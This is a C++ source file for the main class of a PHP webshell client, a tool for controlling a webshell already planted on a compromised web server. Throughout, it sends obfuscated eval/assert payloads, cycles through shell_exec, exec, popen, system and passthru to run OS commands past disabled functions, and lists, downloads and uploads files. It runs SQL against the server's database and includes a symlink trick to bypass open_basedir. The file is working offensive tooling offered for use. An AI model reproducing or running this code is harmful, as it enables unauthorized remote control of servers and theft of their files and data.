
/**************************************************************************
Copyright:Image
Author: Image
Date:2017-09-10
Description:phpwebshell main class
***************************************************************************/



#include "WebShell.h"


WebShell::WebShell(string addr, METHOD meth, string password, PLACE paramplace,string paramvalue):place(paramplace,paramvalue)
{
	this->url = addr;
	this->Method = meth;
	this->pass = password;
	this->initialized=false;
}
void WebShell::initialize(){
	this->get_disabled_functions();
	/*	
	for(vector<string>::iterator it=this->disabled_functions.begin();it!=this->disabled_functions.end();it++){
		cout<<*it<<endl;
	}
	
	if(find(this->disabled_functions.begin(),this->disabled_functions.end(),"shell_exec")==this->disabled_functions.end()){cout<<"int"<<endl;}
	*/
}
void WebShell::addClientMethod(ENCRYPT_METHOD meth, string param) {
	this->EncryptMethod.push_back(make_pair(meth, param));
}

CURLcode WebShell::php_exec(string command,string&ans,map<string,string>*addonparams) {
	srand(time(0));
	if(!this->initialized){
		this->initialized=true;
		this->initialize();
	}
	string  mark = to_string(1000*rand());
	string evalphp;
    string commandpos=cryptohelper::base64_encode(pass);
    int badpoint=commandpos.find("=");
    if(badpoint!=string::npos){
        commandpos=commandpos.substr(0,badpoint);
    }
	if (find(disabled_functions.begin(), disabled_functions.end(), "eval") == disabled_functions.end())
		evalphp = "eval(base64_decode($_POST[" + commandpos + "]));";
	else if(find(disabled_functions.begin(), disabled_functions.end(), "assert") == disabled_functions.end())
		evalphp = "assert(base64_decode($_POST[" + commandpos + "]));";
	else if(find(disabled_functions.begin(), disabled_functions.end(), "preg_replace") == disabled_functions.end())
		evalphp = "preg_replace('/xxx/e',base64_decode($_POST[" + commandpos + "]),'');";
	if (this->EncryptMethod.size()!=0) {
		evalphp = this->encode(evalphp);
	}
    command="@ini_set(\"display_errors\",\"0\");@set_time_limit(0);echo \'"+mark+"\';"+command+";echo \'"+mark+"\';";
	//cout << evalphp << endl;
	map<string, string>headers;
	map<string, string>postparams;
	map<string, string>cookies;
	map<string, string>params;
	switch (place.first)
	{
	case HEADER:
		headers[curlhelper::UrlEncode(place.second)] = curlhelper::UrlEncode(evalphp);
		break;
	case COOKIE:
		cookies[curlhelper::UrlEncode(place.second)] = curlhelper::UrlEncode(evalphp);
		break;
	case PLACE_POST:
		//postparams[curlhelper::UrlEncode(place.second)] = curlhelper::UrlEncode(evalphp);
		//break;
	case PLACE_GET:
		//params[curlhelper::UrlEncode(place.second)] = curlhelper::UrlEncode(evalphp);
		//break;
	default:
		switch (Method) {
		case GET:
			params[pass] = curlhelper::UrlEncode(evalphp);
			break;
		case POST:
			postparams[pass] = curlhelper::UrlEncode(evalphp);
		default:
			break;
		}
	}
	//cout << curlhelper::UrlEncode(cryptohelper::base64_encode(pass)) << endl;
	if (addonparams != NULL) {
		for (map<string, string>::iterator it = addonparams->begin(); it != addonparams->end(); it++) {
			postparams[it->first] = it->second;
		}
	}
	postparams[curlhelper::UrlEncode(commandpos)] = curlhelper::UrlEncode(cryptohelper::base64_encode(command));
	for (map<string, string>::iterator it = this->addon_post.begin(); it != this->addon_post.end(); it++) {
		map<string, string>::iterator now = postparams.find(it->first);
		if (now != postparams.end()){
		size_t place=it->second.find("@PARAM");
		 now->second = it->second.replace(place,6, now->second);
		}
		else postparams[it->first] = it->second;
	}
	for (map<string, string>::iterator it = this->addon_get.begin(); it != this->addon_get.end(); it++) {
		map<string, string>::iterator now = params.find(it->first);
		if (now != params.end()){
		size_t place=it->second.find("@PARAM");
		 now->second = it->second.replace(place,6, now->second);
		}
		else params[it->first] = it->second;
	}
	for (map<string, string>::iterator it = this->customHeaders.begin(); it != this->customHeaders.end(); it++) {
		map<string, string>::iterator now = headers.find(it->first);
		if (now != headers.end()){
		size_t place=it->second.find("@PARAM");
		 now->second = it->second.replace(place,6, now->second);
		}
		else headers[it->first] = it->second;
	}
	for (map<string, string>::iterator it = this->customCookies.begin(); it != this->customCookies.end(); it++) {
		map<string, string>::iterator now = cookies.find(it->first);
		if (now != cookies.end()){
		size_t place=it->second.find("@PARAM");
		 now->second = it->second.replace(place,6, now->second);
		}
		else cookies[it->first] = it->second;
	}
	for(auto cook:cookies){
		cout<<((pair<string,string>)cook).first<<" "<<((pair<string,string>)cook).second<<endl;
	}

	string websitecallback = "";
	CURLcode res = curlhelper::post(this->url, websitecallback, &postparams, &headers, &cookies, &params);

	
	size_t beginindex = websitecallback.find(mark);
	if (beginindex != string::npos) {
		size_t endindex = websitecallback.find(mark,beginindex+mark.size());
		if (endindex == string::npos)endindex = websitecallback.size() - 1;
		ans = websitecallback.substr(beginindex + mark.size(), endindex - beginindex -mark.size());
		//cout << ans << endl;
	}
	else {
		ans = "";
	}
	//cout << ans << endl;
	return res;
}
void WebShell::get_disabled_functions() {
	string command = "echo preg_replace('/\\s/','',ini_get('disable_functions'));";
	string ans;
	CURLcode code=php_exec(command,ans);
	int begin = 0, end = ans.find(',',0);
	while (end!=-1 && begin <= string::npos) {
	//	cout<<begin<<'\t'<<end<<endl;
		this->disabled_functions.push_back(ans.substr(begin,end-begin));
		begin = end + 1;
		end = ans.find(',', begin);
	}
	if(begin<string::npos)
		this->disabled_functions.push_back(ans.substr(begin));
}
string WebShell::get_webroot() {
	string command = "echo base64_encode(dirname(__FILE__));";
	string res;
	CURLcode ans = php_exec(command,res);
	if (ans != CURLE_OK && ans != CURLE_HTTP_NOT_FOUND) {
		res = curl_easy_strerror(ans);
	}
	else {
		if (res == "")return "/var/www/html";
		res = cryptohelper::base64_decode(res);
		
		this->webroot = res;
	}
	
	return res;
}
void WebShell::setPlace(string paramplace, string paramvalue) {
	if (paramplace == "GET") {
		place.first = PLACE_GET;
	}
	else if (paramplace == "POST") {
		place.first = PLACE_POST;
	}
	else if (paramplace == "HEADER") {
		place.first = HEADER;
	}
	else if (paramplace == "COOKIE") {
		place.first = COOKIE;
	}
	else return;
	place.second = paramvalue;
}
string WebShell::get_php_version() {
	string command = "echo base64_encode(PHP_VERSION)";
	string res;
	CURLcode ans = php_exec(command, res);
	if (ans != CURLE_OK && ans!=CURLE_HTTP_NOT_FOUND) {
		res = curl_easy_strerror(ans);
	}
	else {
		res = cryptohelper::base64_decode(res);
		this->php_version = res;
	}
	return res;
}
void WebShell::ParseMethod(string meth) {
	vector<string>vect;
	int begin = 0, end = meth.find('*', 0);
	//cout << end << endl;
	while (end != string::npos) {
		vect.push_back(meth.substr(begin, end - begin));
		begin = end+1;
		end = meth.find('*', begin);
	}
	if (begin < string::npos)vect.push_back(meth.substr(begin));
	//cout << vect.size() << endl;
	pair<string, string> temp;
	for (vector<string>::iterator it = vect.begin(); it != vect.end(); it++) {
		it->erase(0, it->find_first_not_of(' '));
		it->erase(it->find_last_not_of(' ') + 1);
		int seperator = it->find(' ');
		
		temp.first = it->substr(0, seperator);
		//cout << (seperator != string::npos) << endl;
		if (seperator != string::npos)
			temp.second = it->substr(seperator);
		else
			temp.second = "";
		if (temp.first == "BASE64_ENCODE") addClientMethod(BASE64_ENCODE, temp.second);
		else if (temp.first == "BASE64_DECODE")addClientMethod(BASE64_DECODE,temp.second);
		else if (temp.first == "REVERSE")addClientMethod(REVERSE, temp.second);
		else if (temp.first == "ROT13")  addClientMethod(ROT13, temp.second);
		else if (temp.first == "PADDING")addClientMethod(PAADING, temp.second);
	}

}
string WebShell::get_kernel_version() {
	string command = "uname -a";
	string res;
	CURLcode ans = ShellCommandExec(command, res);
	if (ans != CURLE_OK && ans != CURLE_HTTP_NOT_FOUND) {
		res = curl_easy_strerror(ans);
	}
	else {
		this->php_version = res;
	}
	return res;
}
CURLcode WebShell::ShellCommandExec(string command,string& ans) {
	if(!this->initialized){
		this->initialized=true;
		this->initialize();
	}
	string phpsentence = "";
	if (find(disabled_functions.begin(), disabled_functions.end(), "shell_exec") ==disabled_functions.end())
		phpsentence = "$a='" + command + "';"
		"if(isset($_COOKIE['dir']))$dir=$_COOKIE['dir'];"
		"else$dir=dirname(__FILE__);"
		"chdir($dir);$a=$a.';';"
		"$commands=explode(';',$a);"
		"foreach($commands as $command){"
		"$command=trim($command);"
		"if(preg_match('/cd\\s([^\\\\&]*)/',$command,$ans))"
		"{if(is_dir($ans[1]))"
		"{if(substr($ans[1],0,1)=='/')$dir=$ans[1];"
		"else $dir.='/'.$ans[1];}}}"
		"echo base64_encode(shell_exec($a));"
		"setcookie('dir',$dir);//";
	else if (find(disabled_functions.begin(), disabled_functions.end(), "exec") == disabled_functions.end())
		phpsentence = "$a='" + command + "';"
		"if(isset($_COOKIE['dir']))$dir=$_COOKIE['dir'];"
		"else$dir=dirname(__FILE__);"
		"chdir($dir);$a=$a.';';"
		"$commands=explode(';',$a);"
		"foreach($commands as $command){"
		"$command=trim($command);"
		"if(preg_match('/cd\\s([^\\\\&]*)/',$command,$ans))"
		"{if(is_dir($ans[1]))"
		"{if(substr($ans[1],0,1)=='/')$dir=$ans[1];"
		"else $dir.='/'.$ans[1];}}}"
		"$result=array();"
		"exec($a,$result);"
		"$answer='';"
		"foreach($result as $per){$answer.=$per.\"\\r\\n\";}"
		"echo base64_encode($answer);"
		"setcookie('dir',$dir);//";
	else if (find(disabled_functions.begin(), disabled_functions.end(), "popen") == disabled_functions.end())
		phpsentence = "$a='" + command + "';"
		"if(isset($_COOKIE['dir']))$dir=$_COOKIE['dir'];"
		"else{$dir=dirname(__FILE__);}"
		"chdir($dir);$a=$a.';';"
		"$commands=explode(';',$a);"
		"foreach($commands as $command){"
		"$command=trim($command);"
		"if(preg_match('/cd\\s([^\\\\&]*)/',$command,$ans))"
		"{if(is_dir($ans[1]))"
		"{if(substr($ans[1],0,1)=='/')$dir=$ans[1];"
		"else $dir.='/'.$ans[1];}}}"
		"    $fp = popen($a,'r');"
		"$ans=\"\";"
		"while (!feof($fp))"
		"{"
		"$ans=$ans.fread($fp, 1024);"
		"} "
		"echo base64_encode($ans);"
		"setcookie('dir',$dir);//";
	else if (find(disabled_functions.begin(), disabled_functions.end(), "system") == disabled_functions.end())
		phpsentence = "$a='" + command + "';"
		"if(isset($_COOKIE['dir']))$dir=$_COOKIE['dir'];"
		"else$dir=dirname(__FILE__);"
		"chdir($dir);$a=$a.';';"
		"$commands=explode(';',$a);"
		"foreach($commands as $command){"
		"$command=trim($command);"
		"if(preg_match('/cd\\s([^\\\\&]*)/',$command,$ans))"
		"{if(is_dir($ans[1]))"
		"{if(substr($ans[1],0,1)=='/')$dir=$ans[1];"
		"else $dir.='/'.$ans[1];}}}"
		"system($a);"
		"setcookie('dir',$dir);//";
	else if (find(disabled_functions.begin(), disabled_functions.end(), "passthru") == disabled_functions.end())
		phpsentence = "$a='" + command + "';"
		"if(isset($_COOKIE['dir']))$dir=$_COOKIE['dir'];"
		"else$dir=dirname(__FILE__);"
		"chdir($dir);$a=$a.';';"
		"$commands=explode(';',$a);"
		"foreach($commands as $command){"
		"$command=trim($command);"
		"if(preg_match('/cd\\s([^\\\\&]*)/',$command,$ans))"
		"{if(is_dir($ans[1]))"
		"{if(substr($ans[1],0,1)=='/')$dir=$ans[1];"
		"else $dir.='/'.$ans[1];}}}"
		"passthru($a);"
		"setcookie('dir',$dir);//";
	else return CURLE_COULDNT_CONNECT;
	CURLcode res=php_exec(phpsentence, ans);
	if (res != CURLE_OK&& res != CURLE_HTTP_NOT_FOUND)ans = curl_easy_strerror(res);
	else ans = cryptohelper::base64_decode(ans);
	return res;
}
string WebShell::encode(string source) {
	string out = source;
	for (vector<pair<ENCRYPT_METHOD,string>>::iterator it = EncryptMethod.begin(); it != EncryptMethod.end(); it++) {
		switch (it->first) {
		case BASE64_ENCODE:
			out = cryptohelper::base64_encode(out);
			break;
		case BASE64_DECODE:
			out = cryptohelper::base64_decode(out);
			break;
		case REVERSE:
			reverse(out.begin(), out.end());
			break;
		case ROT13:
			out = cryptohelper::rot13(out);
			break;
		case PAADING:
			for (string::iterator sit = out.begin(); sit != out.end(); sit++) {
				sit=out.insert(sit,it->second.begin(),it->second.end());
				sit += it->second.size();
			}
			break;
		default:
			break;
			}
	}
	return out;
}
CURLcode WebShell::GetFileList(string&ans, string directory) {
	if (directory == "")
		directory = this->get_webroot();
	string phpcommand = "chdir('" + directory + "');$basedir=getcwd();$ans=array();"
		"foreach(scandir('.') as $file)"
		"{array_push($ans,array("
		"'filename'=>$basedir.'/'.$file,"
		"'filegroup'=>filegroup($basedir.'/'.$file),"
		"'fileowner'=>fileowner($basedir.'/'.$file),"
		"'fileperms'=>substr(sprintf('%o',fileperms($basedir.'/'.$file)),-4),"
		"'filetype'=>filetype($basedir.'/'.$file),"
		"'filesize'=>filesize($basedir.'/'.$file)));"
		"}"
		"echo base64_encode(json_encode($ans));";
	//cout << phpcommand << endl;
	CURLcode code=php_exec(phpcommand, ans);
	//cout<<ans<<endl;
	if (code == CURLE_OK || code == CURLE_HTTP_NOT_FOUND) {
		ans = cryptohelper::base64_decode(ans);
	}
	else
		ans = curl_easy_strerror(code);
	return code;
}
CURLcode WebShell::GetFile(string filename, string downname) {
	string phpcommand = "";
	string is_open_basedir_limited = "";
	php_exec("echo preg_replace('/\\s*,\\s*/','|',ini_get('open_basedir'));", is_open_basedir_limited);
	vector<string> basedir;
	int begin, end;
	begin = 0;
	end = is_open_basedir_limited.find(',');
	if (end != string::npos) {
		basedir.push_back(is_open_basedir_limited.substr(begin,end-begin));
		begin = end + 1;
		end = is_open_basedir_limited.find(',');
	}
	if (begin < string::npos)
		basedir.push_back(is_open_basedir_limited.substr(begin, end - begin));
	bool mark = false;
	for (vector<string>::iterator it = basedir.begin(); it != basedir.end(); it++) {
		if (filename.find(*it) != string::npos)
			mark = true;
	}
	mark = mark || is_open_basedir_limited.size()==0;
	if (mark) {
		if (find(this->disabled_functions.begin(), this->disabled_functions.end(), "file_get_contents") == this->disabled_functions.end())
			phpcommand = "echo @base64_encode(file_get_contents('" + filename + "'));";
		else if (find(this->disabled_functions.begin(), this->disabled_functions.end(), "fopen") == this->disabled_functions.end())
			phpcommand = "$f=fopen('" + filename + "','rb');echo @base64_encode(fread($f,filesize('" + filename + "')));";
		else {
			string ans;
			CURLcode c=ShellCommandExec("cat " + filename, ans);
			fstream f(downname.c_str(), ios::out|ios::binary);
			f.write((char*)(ans.data()), sizeof(char)*(ans.size()));
			f.close();
			return c;
		}
	}
	else {
		phpcommand="header('content-type: text/plain');"
"error_reporting(-1);"
"ini_set('display_errors', TRUE);"
"$file = str_replace('\\', '/', \'"+filename+"\');"
"$relat_file = getRelativePath(__FILE__, $file);"
"$paths = explode('/', $file);"
"$name = mt_rand() % 999;"
"$exp = getRandStr();"
"mkdir($name);"
"chdir($name);"
"for($i = 1 ; $i < count($paths) - 1 ; $i++){"
"    mkdir($paths[$i]);"
"    chdir($paths[$i]);"
"}"
"mkdir($paths[$i]);"
"for ($i -= 1; $i > 0; $i--) { "
"    chdir('..');"
"}"
"$paths = explode('/', $relat_file);"
"$j = 0;"
"for ($i = 0; $paths[$i] == '..'; $i++) { "
"    mkdir($name);"
"    chdir($name);"
"    $j++;"
"}"
"for ($i = 0; $i <= $j; $i++) { "
"    chdir('..');"
"}"
"$tmp = array_fill(0, $j + 1, $name);"
"symlink(implode('/', $tmp), 'tmplink');"
"$tmp = array_fill(0, $j, '..');"
"symlink('tmplink/' . implode('/', $tmp) . $file, $exp);"
"unlink('tmplink');"
"mkdir('tmplink');"
"delfile($name);"
"$exp = dirname($_SERVER['SCRIPT_NAME']) .\" / {$exp}\";"
"$exp = \"http://{$_SERVER['SERVER_NAME']}{$exp}\";"
		"echo base64_encode(file_get_contents($exp));"
			"delfile('tmplink');"
			""
			"function getRelativePath($from, $to) {"
			"  // some compatibility fixes for Windows paths"
			"  $from = rtrim($from, '/') . '/';"
			"  $from = str_replace('\\', '/', $from);"
			"  $to   = str_replace('\\', '/', $to);"
			""
			"  $from   = explode('/', $from);"
			"  $to     = explode('/', $to);"
			"  $relPath  = $to;"
			""
			"  foreach($from as $depth => $dir) {"
			"    // find first non-matching dir"
			"    if($dir === $to[$depth]) {"
			"      // ignore this directory"
			"      array_shift($relPath);"
			"    } else {"
			"      // get number of remaining dirs to $from"
			"      $remaining = count($from) - $depth;"
			"      if($remaining > 1) {"
			"        // add traversals up to first matching dir"
			"        $padLength = (count($relPath) + $remaining - 1) * -1;"
			"        $relPath = array_pad($relPath, $padLength, '..');"
			"        break;"
			"      } else {"
			"        $relPath[0] = './' . $relPath[0];"
			"      }"
			"    }"
			"  }"
			"  return implode('/', $relPath);"
			"}"
			""
			"function delfile($deldir){"
			"    if (@is_file($deldir)) {"
			"        @chmod($deldir,0777);"
			"        return @unlink($deldir);"
			"    }else if(@is_dir($deldir)){"
			"        if(($mydir = @opendir($deldir)) == NULL) return false;"
			"        while(false !== ($file = @readdir($mydir)))"
			"        {"
			"            $name = File_Str($deldir.'/'.$file);"
			"            if(($file!='.') && ($file!='..')){delfile($name);}"
			"        } "
			"        @closedir($mydir);"
			"        @chmod($deldir,0777);"
			"        return @rmdir($deldir) ? true : false;"
			"    }"
			"}"
			""
			"function File_Str($string)"
			"{"
			"    return str_replace('//','/',str_replace('\\','/',$string));"
			"}"
			""
			"function getRandStr($length = 6) {"
			"    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';"
			"    $randStr = '';"
			"    for ($i = 0; $i < $length; $i++) {"
			"        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);"
			"    }"
			"    return $randStr;"
			"}";
	}
	string ans;
	CURLcode c=php_exec(phpcommand, ans);
	ans = cryptohelper::base64_decode(ans);
	ofstream of(downname.c_str(), ios::out | ios::binary);
	of.write(ans.c_str(), sizeof(char)*ans.size());
	of.close();
	return c;
}
CURLcode WebShell::UploadFile(string filename, string updir) {
	string parameter = to_string(rand()*1000);
	string command = "file_put_contents('" + updir + "',base64_decode($_POST['" + parameter + "']));";
	fstream f(filename, ios::binary | ios::in);
	if (!f.is_open())return CURLE_CHUNK_FAILED;
	string data;
	char buffer[1024];
	while (!f.eof()) {
		f.read(buffer, sizeof(char) * 1024);
		data.append(buffer, sizeof(char)*f.gcount());
	}
	data = cryptohelper::base64_encode(data);
	map<string, string> postfile;
	postfile[parameter] = curlhelper::UrlEncode(data);
	string ans;
	CURLcode c=php_exec(command, ans, &postfile);
	return c;
}
void WebShell::setSQLconnection(string host, string user, string pass, string port) {
	this->SQLhost = host;
	this->SQLuser = user;
	this->SQLpass = pass;
	this->SQLport = port;
}
CURLcode WebShell::ExecSQL(string sql, string db, string& ans) {
	string phpcommand = "$conn=mysqli_connect('" + this->SQLhost + "','" + this->SQLuser + "', '" + this->SQLpass + "', '" + db + "', " + this->SQLport + "); "
		"$query=mysqli_query($conn,'" + sql + "');"
		"$ans=array();"
		"while($row=mysqli_fetch_assoc($query)){"
		"	array_push($ans,$row);"
		"}"
		"echo json_encode($ans);";
	cout << phpcommand << endl;
	CURLcode res = this->php_exec(phpcommand,ans);
	
	return res;
}
void WebShell::addAddonGet(string get, string param) {
	this->addon_get[curlhelper::UrlEncode(get)] = curlhelper::UrlEncode(param);
}
void WebShell::addAddonPost(string post, string param) {
	this->addon_post[curlhelper::UrlEncode(post)] = curlhelper::UrlEncode(param);
}
void WebShell::addHeader(string param,string paramvalue){
	this->customHeaders[param]=paramvalue;
}
void WebShell::addCookie(string param,string paramvalue){
	this->customCookies[curlhelper::UrlEncode(param)]=curlhelper::UrlEncode(paramvalue);
}
bool WebShell::check_connection() {
	string ans;
	php_exec("echo 'whats_the_fuck'", ans);
	return (ans == "whats_the_fuck");
}
WebShell::~WebShell()
{
}


